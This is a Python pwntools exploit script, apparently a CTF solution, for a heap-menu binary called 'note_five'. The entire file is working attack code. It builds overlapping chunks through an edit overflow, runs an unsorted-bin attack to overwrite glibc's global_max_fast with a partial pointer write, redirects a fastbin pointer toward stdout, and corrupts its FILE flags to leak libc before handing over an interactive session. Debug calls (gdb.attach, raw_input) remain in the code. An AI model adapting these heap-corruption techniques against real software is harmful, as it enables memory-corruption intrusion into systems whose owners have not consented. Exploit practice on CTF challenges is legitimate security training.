from pwn import *
context.binary = './note_five'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./note_five')

def dbg():
	raw_input()

def exploit():
	sa = lambda x, y: p.sendafter(x, y)
	sla = lambda x, y: p.sendlineafter(x, y)

	def create(idx, size):
		sla('choice>> ', '1')
		while p.recv(5) != 'idx: ':
			sla('choice>> ', '1')
		p.sendline(str(idx))
		sla('size: ',str(size))
		print "create chunk success!"

	def delete(idx):
		sla('choice>> ', '3')
		while p.recv(5) != 'idx: ':
			sla('choice>> ', '3')
		p.sendline(str(idx))
		print "delete chunk %d success!" % idx

	def edit(idx, content):
		while p.recv(5) != 'idx: ':
			sla('choice>> ', '2')
		p.sendline(str(idx))
		sa('content: ',content)
		print "edit chunk %d success!" % idx


	global_max_fast = 0x67f8  #0x3c67f8
	create(0, 0x98)				#0xa0
	create(1, 0x98)				#0xa0
	create(2, 0x98)				#0xa0
	create(3, 0x98)				#0xa0
	delete(0)					#unsorted bin
	edit(1, 'a'*0x90 + p64(0x140) + p64(0xa0))	#chunk overlapping

	delete(2)					#unlink free chunk0 and chunk1 and chunk2

	create(0, 0xe8)				#0xf0 contain chunk1' header    fake_1
								#leave is also 0xf0				fake_2
	edit(1, 'a'*0x40 + p64(0) + p64(0xf1) + p64(0) + p16(global_max_fast - 0x10))	#fake_2'bk = global_max_fast
	p.sendline('')
	create(4, 0xe8)				#(fake_2) now global_max_fast is enough big

	gdb.attach(p)
	dbg()
	delete(4)					
	edit(1, 'a'*0x40 + flat(0x0,0xf1) + "\xcf\x25")			#fake_2'fd
	p.sendline('')

	create(4, 0xe8)				#fake_2 chunk4
	create(0, 0xe8)				#chunk0 

	edit(0, '\x00' * 0x41 + p64(0xfbad1800) + flat(0x0,0x0,0x0) + '\x00')
	p.sendline('')
	#
		
	p.interactive()
	p.close()

if __name__ == '__main__':
	exploit()
